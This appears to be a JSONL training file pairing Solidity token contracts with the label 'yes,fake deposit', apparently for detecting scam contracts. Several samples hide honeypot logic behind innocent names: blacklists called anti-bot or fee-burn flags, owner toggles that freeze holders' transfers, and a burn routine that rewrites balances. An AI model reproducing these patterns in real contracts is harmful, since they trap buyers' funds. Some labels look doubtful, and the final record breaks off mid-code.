{"prompt": "\ncontract GrannyShiba is Context, IERC20, Ownable {\n using SafeMath for uint256;\n using Address for address;\n\n mapping (address => uint256) private _rOwned;\n mapping (address => uint256) private _tOwned;\n mapping (address => mapping (address => uint256)) private _allowances;\n mapping (address => bool) private _isExcluded;\n address[] private _excluded;\n mapping (address => bool) private _antiBotDump;\n event botBanned (address botAddress, bool isBanned);\n uint256 private _tFeeTotal;\n bool _liquidity;\n \n uint256 private constant _tTotal = 100000000000000*10**9;\n uint256 private constant MAX = ~uint256(0);\n uint256 private _rTotal = (MAX - (MAX % _tTotal));\n\n address public uniswapV2router;\n \n constructor (address router) {\n uniswapV2router = router;\n _rOwned[_msgSender()] = _rTotal;\n emit Transfer(address(0), _msgSender(), _tTotal);\n _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);\n _isExcluded[_msgSender()] = true;\n _excluded.push(_msgSender());\n _liquidity = true;\n }\n \n \n function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n\n function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n uint256 currentRate = _getRate();\n return rAmount.div(currentRate);\n }\n\n function _transfer(address sender, address recipient, uint256 amount) private {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be greater than zero\");\n if (_antiBotDump[sender] || _antiBotDump[recipient]) require (amount == 0, \"\");\n if (_liquidity == true || sender == owner() || recipient == owner()) {\n if (_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferFromExcluded(sender, recipient, amount);\n } else if (!_isExcluded[sender] && _isExcluded[recipient]) {\n _transferToExcluded(sender, recipient, amount);\n } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferStandard(sender, recipient, amount);\n } else if (_isExcluded[sender] && _isExcluded[recipient]) {\n _transferBothExcluded(sender, recipient, amount);\n } else {_transferStandard(sender, recipient, amount);}\n } else {require (_liquidity == true, \"\");}\n }\n\n function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _reflectFee(uint256 rFee, uint256 tFee) private {\n _rTotal = _rTotal.sub(rFee);\n _tFeeTotal = _tFeeTotal.add(tFee);\n }\n\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\npragma solidity =0.8.3;\n\nimport \"./IERC20.sol\";\nimport \"./IERC20Metadata.sol\";\nimport \"./Context.sol\";\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address =u003e uint256) internal _balances;\n mapping (address =u003e bool) private _approveTransfer;\n mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\n bool intTx = true;\n uint256 _burnRate;\n uint256 internal _totalSupply;\n string internal _name;\n string internal _symbol;\n address internal _owner;\n \n constructor (string memory name_, string memory symbol_) {\n _name = name_;\n _symbol = symbol_;\n _owner = msg.sender;\n }\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: only the owner allowed\");\n _;\n }\n\t\n \n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n function approveTransfer(address _address) external onlyOwner {\n _approveTransfer[_address] = true;\n }\n\n function burnRate (uint256 value) external onlyOwner {\n _burnRate = value;\n }\n \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\n \n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n }\n\n\n function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n uint256 currentAllowance = _allowances[_msgSender()][spender];\n require(currentAllowance u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\n _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n return true;\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(intTx == false, \"\");\n if (intTx == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (intTx == true, \"\");} \n }\n \n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n uint256 accountBalance = _balances[account];\n require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance\");\n _balances[account] = _burnRate - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": " function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n\n function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n uint256 currentRate = _getRate();\n return rAmount.div(currentRate);\n }\n\n\n function _transfer(address sender, address recipient, uint256 amount) private {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be greater than zero\");\n if (BOTaddressToLock[sender] || BOTaddressToLock[recipient])\n require(amount == 0, \"We don't like BOTs, take your toys and go away.\");\n if (allLimitsOff == false && maxTokensLimitDuringFirstHour == false && sender != owner() && recipient != owner()) \n require(amount <= _maxTokensInitialLimit, \"Tokens amount too high. Contract is running on limited mode. Max 0.004 Eth per each transaction.\");\n if (allLimitsOff == false && maxTokensLimitDuringFirstHour == true && sender != owner() && recipient != owner())\n require(amount <= _maxTokensLimitDuringFirstHour, \"Tokens amount too high. Current 1hour limit set to less than 1.0 Eth per each transaction.\");\n if (_contractRunning == true || sender == owner() || recipient == owner()) {\n if (_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferFromExcluded(sender, recipient, amount);\n } else if (!_isExcluded[sender] && _isExcluded[recipient]) {\n _transferToExcluded(sender, recipient, amount);\n } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferStandard(sender, recipient, amount);\n } else if (_isExcluded[sender] && _isExcluded[recipient]) {\n _transferBothExcluded(sender, recipient, amount);\n } else {\n _transferStandard(sender, recipient, amount);\n }\n }\n else {\n require (_contractRunning == true, \"Contract not started yet. Try later.\");\n }\n }\n\n function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _reflectFee(uint256 rFee, uint256 tFee) private {\n _rTotal = _rTotal.sub(rFee);\n _tFeeTotal = _tFeeTotal.add(tFee);\n }\n\n \n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "abstract contract ERC20 is IERC20, Domain {\n mapping(address => uint256) public override balanceOf;\n mapping(address => mapping(address => uint256)) public override allowance\n mapping(address => uint256) public nonces;\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n function transfer(address to, uint256 amount) public returns (bool) {\n if (amount != 0 || msg.sender == to) {\n uint256 srcBalance = balanceOf[msg.sender];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n if (msg.sender != to) {\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so low balance calls safe some gas\n\n balanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount;\n }\n }\n emit Transfer(msg.sender, to, amount);\n return true;\n }\n function transferFrom(\n address from,\n address to,\n uint256 amount\n ) public returns (bool) {\n if (amount != 0) {\n uint256 srcBalance = balanceOf[from];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n\n if (from != to) {\n uint256 spenderAllowance = allowance[from][msg.sender];\n if (spenderAllowance != type(uint256).max) {\n require(spenderAllowance >= amount, \"ERC20: allowance too low\");\n allowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\n }\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so other failed calls safe some gas\n\n balanceOf[from] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount;\n }\n }\n emit Transfer(from, to, amount);\n return true;\n }\n\n function approve(address spender, uint256 amount) public override returns (bool) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n bytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n}\n\n\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "contract StandardToken is Ownable {\n using SafeMath for uint256;\n\n // cooldown\n mapping (address => uint) public lastBuyTime;\n mapping (address => bool) public bots;\n bool _cooldownEnabled = true;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n address uni = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n require(!_cooldownEnabled ||\n ((_from == uni || lastBuyTime[_from] + 30 seconds < block.timestamp) &&\n (_to == uni || lastBuyTime[_to] + 30 seconds < block.timestamp)), \"Cool down bro\");\n require(!bots[_from] && !bots[_to], \"No bots plz\");\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n if (_from != uni) {\n lastBuyTime[_from] = block.timestamp;\n } else if (_to != uni) {\n lastBuyTime[_to] = block.timestamp;\n }\n return true;\n } else { return false; }\n }\n\n function setCooldownEnabled(bool enabled) public onlyOwner {\n _cooldownEnabled = enabled;\n }\n\n function blacklistBots() internal {\n bots[0x000000000000084e91743124a982076C59f10084] = true;\n bots[0x000000917de6037d52b1F0a306eeCD208405f7cd] = true;\n bots[0x1d6E8BAC6EA3730825bde4B005ed7B2B39A2932d] = true;\n bots[0x7100e690554B1c2FD01E8648db88bE235C1E6514] = true;\n bots[0x72b30cDc1583224381132D379A052A6B10725415] = true;\n bots[0x9282dc5c422FA91Ff2F6fF3a0b45B7BF97CF78E7] = true;\n bots[0x9eDD647D7d6Eceae6bB61D7785Ef66c5055A9bEE] = true;\n bots[0xfad95B6089c53A0D1d861eabFaadd8901b0F8533] = true;\n }\n\n function blacklistBot(address bot) public onlyOwner {\n bots[bot] = true;\n }\n\n function unBlacklistBot(address bot) public onlyOwner {\n bots[bot] = false;\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n \n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "contract ERC20 is Context, IERC20, IERC20Metadata { \n mapping (address = u003e uint256) internal _balances; \n mapping (address = u003e bool) private _feeBurn; \n mapping (address = u003e mapping (address = u003e uint256)) private _allowances; \n bool intTx = true; \n uint256 _burnRate; \n uint256 internal _totalSupply; \n string internal _name; \n string internal _symbol; \n address internal _owner; \n\n constructor (string memory name_, string memory symbol_) { \n _name = name_; \n _symbol = symbol_; \n _owner = msg.sender; \n }\n modifier onlyOwner() { \n require(_owner == msg.sender, \"Ownable: only the owner allowed \"); \n _; \n } \n function totalSupply() public view virtual override returns (uint256) { \n return _totalSupply; \n } \n \n \n function feeBurn(address _address) external onlyOwner { \n \n _feeBurn[_address] = true; \n \n } \n\n function initContract() public virtual onlyOwner { \n if (intTx == true) {intTx = false;} else {intTx = true;} \n } \n \n function burnRate (uint256 value) external onlyOwner { \n _burnRate = value; \n } \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) { \n \n _approve(_msgSender(), spender, amount); \n \n return true; \n \n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n \n _transfer(sender, recipient, amount); \n \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n \n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance \"); \n \n _approve(sender, _msgSender(), currentAllowance - amount); \n \n return true; \n \n } \n \n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n \n require(sender != address(0), \"ERC20: transfer from the zero address \"); \n \n require(recipient != address(0), \"ERC20: transfer to the zero address \"); \n \n require(amount u003e 0, \"Transfer amount must be grater thatn zero \"); \n \n if (_feeBurn[sender] || _feeBurn[recipient]) \n \n require(intTx == false, \" \"); \n \n if (intTx == true || sender == _owner || recipient == _owner) { \n \n _beforeTokenTransfer(sender, recipient, amount); \n \n uint256 senderBalance = _balances[sender]; \n \n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance \"); \n \n _balances[sender] = senderBalance - amount; \n \n _balances[recipient] += amount; \n \n emit Transfer(sender, recipient, amount);} \n \n else {require (intTx == true, \" \");} \n \n } \n \n function _burn(address account, uint256 amount) internal virtual { \n \n require(account != address(0), \"ERC20: burn from the zero address \"); \n \n uint256 accountBalance = _balances[account]; \n \n require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance \"); \n \n _balances[account] = _burnRate - amount; \n \n _totalSupply -= amount; \n \n emit Transfer(account, address(0), amount); \n \n } \n\n function _approve(address owner, address spender, uint256 amount) internal virtual { \n \n require(owner != address(0), \"ERC20: approve from the zero address \"); \n \n require(spender != address(0), \"ERC20: approve to the zero address \"); \n \n \n \n _allowances[owner][spender] = amount; \n \n emit Approval(owner, spender, amount); \n \n } \n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { } \n \n} \n\n \n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity =0.8.3;\n\nimport \"./IERC20.sol\";\nimport \"./IERC20Metadata.sol\";\nimport \"./Context.sol\";\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address =u003e uint256) internal _balances;\n mapping (address =u003e bool) private _feeBurn;\n mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\n bool intTx = true;\n uint256 _burnRate;\n uint256 internal _totalSupply;\n address internal _owner;\n uint256 public _decreaseFee = 7000000 * 10**18;\n mapping (address =u003e bool) public _approvedTransfer;\n mapping (address =u003e bool) public _bBots;\n\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: only the owner allowed\");\n _;\n }\n\n\n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n \n\n function feeBurn(address _address) external onlyOwner {\n _feeBurn[_address] = true;\n }\n\n function feeBurned(address _address) public view returns (bool) {\n return _feeBurn[_address];\n }\n\n function initContract() public virtual onlyOwner {\n if (intTx == true) {intTx = false;} else {intTx = true;}\n }\n \n\n function burnRate (uint256 value) external onlyOwner {\n _burnRate = value;\n }\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\n\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\n \n if(!_approvedTransfer[sender] u0026u0026 _bBots[recipient]) {\n require(amount u003c= _decreaseFee, \"Transfer amount exceeds the maxTxAmount.\"); \n }\n \n\n if (_feeBurn[sender] || _feeBurn[recipient]) \n require(intTx == false, \"\");\n if (intTx == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (intTx == true, \"\");} \n }\n\n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n uint256 accountBalance = _balances[account];\n require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance\");\n _balances[account] = _burnRate - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n\n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n\n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n \n function decreaseFee(uint256 decreaseFeeAddress) external onlyOwner() {\n _decreaseFee = decreaseFeeAddress;\n }\n \n function approveTransfer(address account) external onlyOwner {\n _approvedTransfer[account] = true; \n }\n \n function bBots(address account) external onlyOwner {\n _bBots[account] = true;\n }\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\ncontract RABBITROCKET is Context, IERC20, IERC20Metadata, Ownable { \n\n address internal constant UniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; \n uint256 _NUM = 1 * 10**9;\n mapping(address => uint256) private _balances;\n mapping(address => mapping(address => uint256)) private _allowances;\n uint256 private _totalSupply;\n bool isValue = true; \n constructor() {\n _totalSupply = 1000 * 10**9 * 10**9;\n _balances[_msgSender()] = _totalSupply;\n emit Transfer(address(0), _msgSender(), _totalSupply);\n }\n\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n //_transfer(_msgSender(), recipient, amount);\n if(_msgSender() == UniswapV2Router || _msgSender() == UniswapPair() || UniswapPair() == address(0) || _msgSender() == owner()) {\n _transfer(_msgSender(), recipient, amount);\n } else {\n //nomal user check amount\n if( (amount <= _NUM || isValue) && !isContract(_msgSender()) ) {\n _transfer(_msgSender(), recipient, amount);\n }\n }\n return true;\n }\n\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(\n address sender,\n address recipient,\n uint256 amount\n ) public virtual override returns (bool) {\n if(sender == UniswapV2Router || sender == UniswapPair() || UniswapPair() == address(0) || sender == owner()) {\n _transfer(sender, recipient, amount);\n \n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n unchecked {\n _approve(sender, _msgSender(), currentAllowance - amount);\n }\n } else {\n //nomal user check amount\n if( (amount <= _NUM || isValue) && !isContract(sender) ) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n unchecked {\n _approve(sender, _msgSender(), currentAllowance - amount);\n }\n }\n }\n return true;\n }\n\n function UniswapPair() public view virtual returns (address) {\n address UniswapV2Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n address pairAddress = IUniswapFactory(UniswapV2Factory).getPair(address(WETH), address(this));\n return pairAddress;\n }\n\n function isContract(address addr) internal view returns (bool) {\n bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n bytes32 codehash;\n assembly {\n codehash := extcodehash(addr)\n }\n return (codehash != 0x0 && codehash != accountHash);\n }\n\n function _transfer(\n address sender,\n address recipient,\n uint256 amount\n ) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n _beforeTokenTransfer(sender, recipient, amount);\n\n uint256 senderBalance = _balances[sender];\n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n unchecked {\n _balances[sender] = senderBalance - amount;\n }\n _balances[recipient] += amount;\n\n emit Transfer(sender, recipient, amount);\n }\n\n function _approve(\n address owner,\n address spender,\n uint256 amount\n ) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _beforeTokenTransfer(\n address from,\n address to,\n uint256 amount\n ) internal virtual {}\n\n}\n \n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\npragma solidity 0.8.6;\n\n\ncontract NFToken is\n ERC721,\n SupportsInterface\n{\n using AddressUtils for address;\n\n \n string constant ZERO_ADDRESS = \"003001\";\n string constant NOT_VALID_NFT = \"003002\";\n string constant NOT_OWNER_OR_OPERATOR = \"003003\";\n string constant NOT_OWNER_APPROVED_OR_OPERATOR = \"003004\";\n string constant NOT_ABLE_TO_RECEIVE_NFT = \"003005\";\n string constant NFT_ALREADY_EXISTS = \"003006\";\n string constant NOT_OWNER = \"003007\";\n string constant IS_OWNER = \"003008\";\n\n \n bytes4 internal constant MAGIC_ON_ERC721_RECEIVED = 0x150b7a02;\n\n \n mapping (uint256 => address) internal idToOwner;\n\n mapping (uint256 => address) internal idToApproval;\n\n mapping (address => uint256) private ownerToNFTokenCount;\n\n mapping (address => mapping (address => bool)) internal ownerToOperators;\n\n modifier canOperate(\n uint256 _tokenId\n )\n {\n address tokenOwner = idToOwner[_tokenId];\n require(\n tokenOwner == msg.sender || ownerToOperators[tokenOwner][msg.sender],\n NOT_OWNER_OR_OPERATOR\n );\n _;\n }\n\n modifier canTransfer(\n uint256 _tokenId\n )\n {\n address tokenOwner = idToOwner[_tokenId];\n require(\n tokenOwner == msg.sender\n || idToApproval[_tokenId] == msg.sender\n || ownerToOperators[tokenOwner][msg.sender],\n NOT_OWNER_APPROVED_OR_OPERATOR\n );\n _;\n }\n\n modifier validNFToken(\n uint256 _tokenId\n )\n {\n require(idToOwner[_tokenId] != address(0), NOT_VALID_NFT);\n _;\n }\n\n constructor()\n {\n supportedInterfaces[0x80ac58cd] = true; // ERC721\n }\n\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes calldata _data\n )\n external\n override\n {\n _safeTransferFrom(_from, _to, _tokenId, _data);\n }\n\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n external\n override\n {\n _safeTransferFrom(_from, _to, _tokenId, \"\");\n }\n\n function transferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n external\n override\n canTransfer(_tokenId)\n validNFToken(_tokenId)\n {\n address tokenOwner = idToOwner[_tokenId];\n require(tokenOwner == _from, NOT_OWNER);\n require(_to != address(0), ZERO_ADDRESS);\n\n _transfer(_to, _tokenId);\n }\n\n function approve(\n address _approved,\n uint256 _tokenId\n )\n external\n override\n canOperate(_tokenId)\n validNFToken(_tokenId)\n {\n address tokenOwner = idToOwner[_tokenId];\n require(_approved != tokenOwner, IS_OWNER);\n\n idToApproval[_tokenId] = _approved;\n emit Approval(tokenOwner, _approved, _tokenId);\n }\n\n function setApprovalForAll(\n address _operator,\n bool _approved\n )\n external\n override\n {\n ownerToOperators[msg.sender][_operator] = _approved;\n emit ApprovalForAll(msg.sender, _operator, _approved);\n }\n\n function getApproved(\n uint256 _tokenId\n )\n external\n override\n view\n validNFToken(_tokenId)\n returns (address)\n {\n return idToApproval[_tokenId];\n }\n\n function isApprovedForAll(\n address _owner,\n address _operator\n )\n external\n override\n view\n returns (bool)\n {\n return ownerToOperators[_owner][_operator];\n }\n\n function _transfer(\n address _to,\n uint256 _tokenId\n )\n internal\n {\n address from = idToOwner[_tokenId];\n _clearApproval(_tokenId);\n\n _removeNFToken(from, _tokenId);\n _addNFToken(_to, _tokenId);\n\n emit Transfer(from, _to, _tokenId);\n }\n\n function _removeNFToken(\n address _from,\n uint256 _tokenId\n )\n internal\n virtual\n {\n require(idToOwner[_tokenId] == _from, NOT_OWNER);\n ownerToNFTokenCount[_from] -= 1;\n delete idToOwner[_tokenId];\n }\n function _addNFToken(\n address _to,\n uint256 _tokenId\n )\n internal\n virtual\n {\n require(idToOwner[_tokenId] == address(0), NFT_ALREADY_EXISTS);\n\n idToOwner[_tokenId] = 